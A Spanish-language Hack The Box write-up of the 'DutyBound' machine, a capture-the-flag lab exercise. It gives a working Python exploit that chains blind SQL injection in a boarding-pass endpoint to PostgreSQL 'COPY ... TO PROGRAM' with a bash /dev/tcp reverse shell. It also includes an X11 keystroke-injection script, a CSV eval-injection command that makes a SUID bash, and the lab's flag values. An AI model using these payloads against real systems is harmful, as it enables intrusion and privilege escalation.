---
title: DutyBound
description: DutyBound es una máquina Linux Media. el ataque comienza con una inyección SQL ciega en un endpoint que procesa códigos de barras BCBP. Esto permite ejecutar comandos vía PostgreSQL, obteniendo una shell como postgres. despues, se abusa del acceso a la sesión gráfica X11 para inyectar pulsaciones de teclado y pivotar al usuario dutyfree-kiosk. Finalmente, se explota una tarea de systemd que evalúa un archivo CSV escribible para escalar a root.
date: 2026-10-24
toc: true
pin: false
image: assets/img/htb-writeup-dutybound/logo.png
categories:
  - Hack The Box
  - Machines
  - Linux
  - medium
tags:
  - SQL_Injection
  - PostgreSQL
  - bar_coded_boarding_pass
  - data_parsing
  - RCE
  - pg_execute_server_program
  - reverse_shell
  - x11_injection
  - X11
  - Keystroke_Injection
  - systemd_path_unit
  - eval_injection
  - SUID
  - writable_file
  - CSV_Injection
---
## Recon

#####  scan 

Realizamos un escaneo completo de puertos con `nmap`:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.19.26 -oG allports
```

**Resultado:**

*   `22/tcp` (SSH) - OpenSSH 8.9p1 Ubuntu
*   `80/tcp` (HTTP) - Nginx (Redirige a HTTPS)
*   `443/tcp` (SSL/HTTP) - Nginx 1.18.0, Título: "Welcome · AirSnacks Self-Checkout"

#####  Config Host

El certificado SSL revela el dominio. lo añadimos al `/etc/hosts`:
```bash
echo "10.129.19.26 airsnacks.htb" | sudo tee -a /etc/hosts
```

##### Enum Web

Al acceder a `https://airsnacks.htb/`, nos encontramos con una aplicación de auto-checkout (kiosco). Al inspeccionar el código fuente, descubrimos un archivo JavaScript interesante: `/static/app.js`.

En este archivo se revela un endpoint crítico que procesa códigos de barras (BCBP) y un parámetro `raw` que se envía por POST:

*   **Endpoint:** `/checkout/boarding-pass/verify`
*   **Lógica:** Envíar un JSON en formato `{"raw": "..."}` al servidor.

---

## Foothold 'SQL Injection to RCE'

##### BCBP y la Inyección

el endpoint procesa el formato BCBP (Bar Coded Boarding Pass). Este formato tiene una estructura muy estricta basada en longitudes hexadecimales. Al inyectar un payload SQL en el campo `airline_use`, el servidor.

creamos un script en Python que construye la tarjeta calculando dinámicamente los bytes de longitud para evadir el validador. La inyección SQL aprovecha un *stacked query* en PostgreSQL para ejecutar `COPY ... TO PROGRAM`, lo que permite ejecución remota de comandos.

##### Obtaining a valid session

Antes de lanzar el exploit, necesitamos una sesión válida con un carrito de compras para que el servidor no nos bloquee. Guardamos las cookies:
```bash
curl -k -c cookies.txt -X POST https://airsnacks.htb/cart/add -H "Content-Type: application/json" -d '{"sku": "SPR-OGR-1L"}'
```


#### Ejecución del Exploit 'PostgreSQL RCE'

en escucha con `nc`:
```bash
nc -lvnp xxxx
```

ejecutamos el siguiente script `exploit.py`, que inyecta una reverse shell en la base de datos:

```python
import requests
import urllib3

urllib3.disable_warnings()
ip = "x.x.x.x"
port = "xxxx"
cmd = f'bash -c "bash -i >& /dev/tcp/{ip}/{port} 0>&1" &'
item4 = f"'); COPY (SELECT '') TO PROGRAM '{cmd}'; --"


def build(frm="HTB", to="JFK", carrier="BA", flight="0123", julian="297",
          comp="Y", seat="001A", seq="0001A", status="1", name="DOE/JOHN",
          pnr="ABC123", ver="5", p15="0", p12="W", p14="W", p22="6297",
          p16="B", p21="BA ", rep="123", item4=""):
    fixed = ("M1" + name.ljust(20)[:20] + "E" + pnr.ljust(7)[:7] + frm + to +
             carrier.ljust(3)[:3] + flight.ljust(5)[:5] + julian + comp + seat +
             seq + status)
    uniq = p15 + p12 + p14 + p22 + p16 + p21.ljust(3)[:3]
    var = ">" + ver + ("%02X" % len(uniq)) + uniq + ("%02X" % len(rep)) + rep + item4
    return fixed + ("%02X" % len(var)) + var


raw = build(item4=item4)

print(f"[*] Payload final:\n{raw}\n")
session = requests.Session()
session.verify = False

print("[*] Añadiendo al carrito...")
session.post("https://airsnacks.htb/cart/add", json={"sku": "SPR-OGR-1L"})

print("[*] Enviando inyección SQL...")
r = session.post("https://airsnacks.htb/checkout/boarding-pass/verify", json={"raw": raw})

print(f"[*] Status: {r.status_code}")
print(f"[*] Respuesta: {r.text}")
```

con eso se obtiene una reverse shell como el usuario **`postgres`**.

---

## Lateral move 'X11 Injection'

##### Enumeración
El usuario `postgres` tiene acceso a la sesión gráfica X11 del kiosco (`DISPLAY :0`). Podemos abusar de esto inyectando pulsaciones de teclado para abrir una terminal (`xterm`) en la pantalla del kiosco y ejecutar comandos como el usuario real.

##### Inyección de Teclado "Xlib"

al ponernos en escucha en un nuevo puerto:
```bash
nc -lvnp xxxx
```

subimos el script `x11-exec.py` a la máquina víctima con `wget` y lo ejecutamos desde la shell de `postgres`:

```python
#!/usr/bin/env python3
import os, sys, time
if "DISPLAY" not in os.environ: os.environ["DISPLAY"] = ":0"
try:
    from Xlib import X, XK, display
    from Xlib.ext import xtest
except ImportError: sys.exit(1)
try: d = display.Display()
except Exception: sys.exit(1)

def send_key(key_sym_name):
    keysym = XK.string_to_keysym(key_sym_name)
    if keysym == 0: keysym = ord(key_sym_name)
    keycode = d.keysym_to_keycode(keysym)
    if keycode == 0: return
    xtest.fake_input(d, X.KeyPress, keycode)
    xtest.fake_input(d, X.KeyRelease, keycode)
    d.sync()

def send_combo(combo="ctrl+alt+t"):
    parts = combo.lower().split("+")
    key_codes = []
    mapping = {"ctrl": "Control_L", "alt": "Alt_L", "shift": "Shift_L", "super": "Super_L", "win": "Super_L"}
    for p in parts:
        name = mapping.get(p, p)
        sym = XK.string_to_keysym(name)
        code = d.keysym_to_keycode(sym)
        if code: key_codes.append(code)
    for kc in key_codes: xtest.fake_input(d, X.KeyPress, kc)
    d.sync()
    for kc in reversed(key_codes): xtest.fake_input(d, X.KeyRelease, kc)
    d.sync()

def send_text(text):
    shift_code = d.keysym_to_keycode(XK.string_to_keysym("Shift_L"))
    for char in text:
        if char.isupper() or char in '!@#$%^&*()_+{}|:"<>?~':
            xtest.fake_input(d, X.KeyPress, shift_code)
            send_key(char)
            xtest.fake_input(d, X.KeyRelease, shift_code)
        elif char == " ": send_key("space")
        else: send_key(char)
        d.sync()
        time.sleep(0.01)
    send_key("Return")

def main():
    shortcut = input("Key combination [default: ctrl+alt+t]: ").strip() or "ctrl+alt+t"
    payload = input("Input string: ")
    if not payload: return
    delay_input = input("Delay in seconds [default: 1.0]: ").strip()
    try: delay = float(delay_input) if delay_input else 1.0
    except ValueError: delay = 1.0
    send_combo(shortcut)
    time.sleep(delay)
    send_text(payload)

if __name__ == "__main__":
    main()
```


**Ejecución interactiva:**

1. `Key combination [default: ctrl+alt+t]:` -> **Enter**
2. `Input string:` -> `bash -c "bash -i >& /dev/tcp/x.x.x.x/xxxx 0>&1"`
3. `Delay in seconds [default: 1.0]:` -> **Enter**

y nos da una shell como **`dutyfree-kiosk`**, donde podemos leer la flag de `user.txt`.

---

##  PrivEsc

##### Enum - Systemd Path Unit

El usuario `dutyfree-kiosk` pertenece al grupo `pos-ops`. Verificando permisos, notamos que podemos escribir en `/opt/vrs/data/duty-rates.csv`:

```bash
-rw-rw-r-- 1 root pos-ops 59 Oct 24 20:29 /opt/vrs/data/duty-rates.csv
```


Hay un servicio de `systemd` "activado por un `.path unit`" que monitoriza este archivo. Cuando cambia, ejecuta un script como `root` que realiza un `eval` inseguro de los valores del CSV, ejemplo:


`eval "${tax_class}=${duty_pct}"`).

##### Inyección en el CSV 'SUID Bash'

Aprovechando el `eval` para inyectar un comando y copiar `/bin/bash`, darle permisos SUID y ejecutarlo:

```bash
echo 'SPIRITS=$(cp /bin/bash /tmp/.rb;chmod 4755 /tmp/.rb),45,20' > /opt/vrs/data/duty-rates.csv
```

Esperamos unos segundos a que`systemd`se dispare y ejecute nuestro payload como `root`.

##### end

```bash
sleep 2
/tmp/.rb -p

.rb-5.1# whoami
root
```

```bash
dutyfree-kiosk# cat user.txt
d05f7962c5beda2a7e6a2aacddac41c9

.rb-5.1# cat /root/root.txt
d55b17fa2ef9ac011470b8c8136baee3
```

----
